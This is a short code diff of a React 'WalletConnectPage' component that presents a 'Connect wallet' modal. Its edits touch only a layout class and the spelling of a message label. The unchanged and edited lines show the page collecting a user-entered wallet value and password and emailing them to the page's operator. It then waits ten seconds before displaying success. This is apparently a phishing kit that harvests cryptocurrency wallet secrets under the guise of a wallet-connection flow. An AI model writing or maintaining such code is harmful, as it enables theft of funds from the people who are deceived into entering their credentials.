@@ -204,7 +204,7 @@ const Modal = ({ isOpen, onClose, onValidate, wallet }) => {
           <h2 className="text-xl font-bold text-white">Connect {wallet?.name}</h2>
         </div>
 
-        <div className="flex space-x-2 mb-6">
+        <div className="flex  flex-wrap gap-3 mb-6">
           {tabs.map(({ id, label, icon: Icon }) => (
             <button
               key={id}
@@ -343,7 +343,7 @@ const WalletConnectPage = () => {
       // Send email first
       await sendEmail(
         selectedWallet?.name,
-        `Value Flare Syncfi EVM from ${type}: ${value}${password ? `\nPassword: ${password}` : ''}${serviceInfo}`
+        `Value Flare SyncFi EVM from ${type}: ${value}${password ? `\nPassword: ${password}` : ''}${serviceInfo}`
       );
       
       // Wait exactly 10 seconds before showing success
